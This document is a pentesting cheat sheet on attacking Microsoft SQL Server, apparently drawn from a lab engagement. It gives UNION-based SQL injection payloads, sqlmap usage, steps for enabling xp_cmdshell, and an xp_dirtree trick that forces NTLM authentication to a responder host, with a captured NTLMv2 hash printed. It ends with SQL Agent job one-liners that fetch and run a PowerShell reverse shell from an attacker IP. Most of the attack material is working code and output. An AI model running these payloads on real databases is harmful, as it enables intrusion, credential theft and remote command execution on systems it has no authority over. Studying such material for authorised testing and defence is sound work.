---
description: MSSQL is a relational database management system
---

# MSSQL

{% embed url="https://www.youtube.com/watch?ab_channel=Fireship&t=6s&v=zsjvFFKOm3c" %}

Microsoft SQL Server (MSSQL) is a powerful database management system used to store, manage, and retrieve large amounts of structured data. This data can be related and use schemas to logically group database objects such tables and views.

{% hint style="info" %}
SQL views are virtual tables that are based on a query. They provide a way to define selections, calculations, or aggregations of data from one or more tables.
{% endhint %}

A MSSQL database consists of database like:

* master :  System-level information for a SQL Server instance and only highly privileged users (like `sa` or members of `sysadmin` role) have access to modify this database.
* tempdb:  Used to store temporary objects and any user can create temporary objects, but permissions on the objects within `tempdb` are controlled by the creator's permissions.
* model: template for all new databases created on the SQL Server
* msdb: Used by SQL Server Agent for scheduling alerts, jobs, and automation tasks

Permissions

* System Administrators (`sysadmin`): Full access to all system databases
* Database Owners (`dbo`): Full control over the specific database they own.
* Security Admins (`securityadmin`): Manage logins, permissions, and server roles.
* Public Role: Basic access to databases

### Vulnerable?

Just like with MySQL we can find vulnerabilities using the `'`  and after inserting the quotation mark we get back an error confirming the vulnerability.&#x20;

Run sqlmap as: `sqlmap -r request --sql-shell`

<figure><img src="../.gitbook/assets/image (127).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
For Microsoft SQL payloads: [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)

[https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
{% endhint %}

### MSSQL Server permissions

<figure><img src="../.gitbook/assets/image (128).png" alt=""><figcaption><p>MSSQL Server permissions</p></figcaption></figure>

Permissions in SQL Server control what actions users can perform on server-level and database-level objects. It ensures that users can only access and manipulate the data they are authorized to. A complete list:

[https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver16](https://learn.microsoft.com/en-us/sql/relational-databases/security/permissions-database-engine?view=sql-server-ver16)

### Basic enumeration

Its possible to use Burp to post the queries and get the output in the response but its also possible using sql-shell from sqlmap.

```bash
# Check version
select @@version;

# Check current user
SELECT SUSER_SNAME(); 
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');

# Current role
SELECT user;

# Get databases
SELECT name FROM master.dbo.sysdatabases;

# Use database
USE master 

# Get tables
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;

# Get columns
SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'YourTableName';

# Show all database user roles for a database
SELECT * FROM sys.database_principals WHERE type_desc != 'DATABASE_ROLE';

# Effective permissions for the server
SELECT * FROM fn_my_permissions(NULL, 'SERVER'); 

# Effective permissions for the database
SELECT * FROM fn_my_permissions(NULL, 'DATABASE'); 

# Check permission excluding null values
SELECT entity_name,permission_name FROM fn_my_permissions('daedalus_admin','USER') WHERE entity_name IS NOT NULL AND permission_name IS NOT NULL
```

### MSSQL Union clause

The UNION clause is used to combine results from multiple select statements. The individual queries must return same number of columns and data types must be compatible. So the injection query must be the same amount of columns as the original columns.&#x20;

To carry out a UNION sql injection we need to find out how many columns because there are because UION only works with even columns. In case we find its uneven we can fill it with junk data or use NULL.

In this example we try `' order by 5-- -` and get back

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

**Amount of columns**: The trying 6 colums with `' order by 6-- -` we get an error out of range, so we know its using 5 columns in the table.

<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

**Check user**: now checking if data is returned, if not the injections is blind. But data is returned, we see a username.

```bash
# Using null to match 5 columns
' UNION ALL SELECT null,CURRENT_USER,null,null,null--
```

<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

**Principals**: are entities (individuals, groups, and processes) that can request SQL Server resources.

```bash
# Normal query would be SELECT * FROM sys.database_principals
' UNION ALL SELECT null,name,null,null,null FROM sys.database_principals--
```

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

**Services:** MS SQL Server provides the following two services which is mandatory for databases creation and maintenance. Other add-on services available for different purposes are also listed.

* SQL Server
* SQL Server Agent

Retrieving information about SQL Server services and those accounts we find ot SQL server agent is running to create jobs as svc\_dev.

```
' UNION ALL SELECT null,servicename,service_account,null,null FROM sys.dm_server_services--
```

<figure><img src="../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

**Collation**: Checking permissions over daedalus\_admin using collate. Collation is a set of rules for sorting and comparing text data, like character sets or case sensitivity.  Specifying `COLLATE DATABASE_DEFAULT` ensures that a query uses the same collation as the database's default,

```bash
' UNION SELECT null,entity_name collate DATABASE_DEFAULT,permission_name collate DATABASE_DEFAULT,null,null FROM fn_my_permissions('daedalus_admin', 'USER');--&
```

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption><p>Permissions</p></figcaption></figure>

### Execute commands

After not finding any usefull information or password hashes in the database we can look for file read, file write or even run commands. To execute commands we can use xp\_cmdshell.

{% hint style="info" %}
In order to be able to execute commands it's not only necessary to have **`xp_cmdshell`** **enabled**, but also have the **EXECUTE permission on the `xp_cmdshell` stored procedure**.
{% endhint %}

If `xp_cmdshell 'whoami'` doesnt work its worth trying `xp_dirtree 'whoami'`.&#x20;

### LLMNR / NBT-NS Spoofing

Using either xp\_cmdshell or xp\_dirtree you can run responder or inveigh and wait for the target has broadcasted the request.

```sql
exec xp_dirtree '\\10.10.14.8\test\test';
sql-shell> 
```

Run responder attack host and capture a NTLMv2 hash.

```bash
$ sudo responder -I tun0                                                                                   

[!] Error starting TCP server on port 53, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : 10.13.38.20
[SMB] NTLMv2-SSP Username : MCZEN\WEB01$
[SMB] NTLMv2-SSP Hash     : WEB01$::MCZEN:bf782154b047f544:7DF40AE673686FCD2E9E49122F971F50:010100000000000000870618D732DB0133D8B5D10E5D9C440000000002000800350030004A005A0001001E00570049004E002D0055003900540032004C0037004C00510054005A00370004003400570049004E002D0055003900540032004C0037004C00510054005A0037002E00350030004A005A002E004C004F00430041004C0003001400350030004A005A002E004C004F00430041004C0005001400350030004A005A002E004C004F00430041004C000700080000870618D732DB0106000400020000000800300030000000000000000000000000300000D2ED0A700555B0532E4668BB55BF3D60A5743890A0A7DF08CD40CDA73A928EBC0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0038000000000000000000
```

### Turn on xp\_cmdshell

```sql
sp_configure 'show advanced options', '1'
RECONFIGURE
#This will enable xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

# Check if its working
EXEC master..xp_cmdshell 'whoami'
```

### Impersonation

You can run commands an another database user using the `execute as user` command.

```sql
EXECUTE AS USER = 'sa'; select user_name();
```

### Job agent

The [MSSQL Server Agent](https://technet.microsoft.com/en-us/library/ms189237\(v=sql.105\).aspx) is a windows service that can be used to perform automated tasks. The agent jobs can be scheduled, and run under the context of the MSSQL Server Agent service. However, using agent proxy capabilities, the jobs can be run with different credentials as well. It can be found as _MS\_AgentSigningCertificate._

```bash
# Using cmd
USE msdb;
EXEC dbo.sp_add_job @job_name = N'PSJob';
EXEC sp_add_jobstep @job_name = N'PSJob', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'powershell.exe -noexit ps', @retry_attempts = 1, @retry_interval = 5;
EXEC dbo.sp_add_jobserver @job_name = N'PSJob'
EXEC dbo.sp_start_job N'PSJob'

# Using powershell
USE msdb;
EXEC dbo.sp_add_job @job_name = N'cmdjob';
EXEC sp_add_jobstep @job_name = N'cmdjob', @step_name = N'test_cmd_name1', @subsystem = N'cmdexec', @command = N'cmd.exe /k calc', @retry_attempts = 1, @retry_interval = 5;
EXEC dbo.sp_add_jobserver @job_name = N'cmdjob';
EXEC dbo.sp_start_job N'cmdjob';
```

### Proxy agent

A proxy agent is used for security and to manage SQL server agent jobs. By default only members of the sysadmin role can execute commands like xp\_cmdshell which operates on the OS and not only in the database. By using a proxy which has in his case CmdExec we can execute commands.

{% hint style="info" %}
**CmdExec** is a job step type in SQL Server Agent that allows you to execute operating system commands, such as batch files, scripts, or executable programs.
{% endhint %}

```
User (zen_admin) -> SQL Agent Job -> Proxy Account -> External Resource
```

<details>

<summary>Creating tables to examine account</summary>

```bash
# create table
' CREATE TABLE proxies (subsystem_id INT PRIMARY KEY NOT NULL, subsystem_name varchar(255), proxy_id INT, proxy_name varchar(255))--

# insert proxy into table
d' EXECUTE AS LOGIN='daedalus_admin'; INSERT proxies EXEC msdb.dbo.sp_enum_proxy_for_subsystem--

# Get data
' UNION ALL SELECT 1,subsystem_name,proxy_name,4,5 FROM proxies--
```

</details>

### SQL agent job with proxy&#x20;

Creating a sql agent job with a proxy using impersonation. We are creating a CmdExec job and then using powershell to get a reverse shell.

```
USE msdb;
EXECUTE AS LOGIN='daedalus_admin';
EXEC dbo.sp_add_job @job_name = N'CYVJHCF';
EXEC dbo.sp_add_jobserver @job_name = N'CYVJHCF';
EXEC dbo.sp_add_jobstep @job_name = N'CYVJHCF', @step_name = N'Exec Payload', @subsystem = N'CmdExec', @command = powershell.exe iex(iwr http://10.10.14.11:443/shell.ps1)|iex', @retry_attempts = 5, @retry_interval = 5, @proxy_name = 'svc_dev';
EXEC dbo.sp_start_job @job_name = N'CYVJHCF';--
```

Or use this oneliner

```
' USE msdb;EXECUTE AS LOGIN='daedalus_admin';EXEC dbo.sp_add_job @job_name = N'CYVJHCF';EXEC dbo.sp_add_jobserver @job_name = N'CYVJHCF';EXEC dbo.sp_add_jobstep @job_name = N'CYVJHCF', @step_name = N'Exec Payload', @subsystem = N'CmdExec', @command = 'powershell.exe iex(iwr http://10.10.14.8:8000/ps_rev2.ps1)|iex', @retry_attempts = 5, @retry_interval = 5, @proxy_name = 'svc_dev';EXEC dbo.sp_start_job @job_name = N'CYVJHCF';--
```

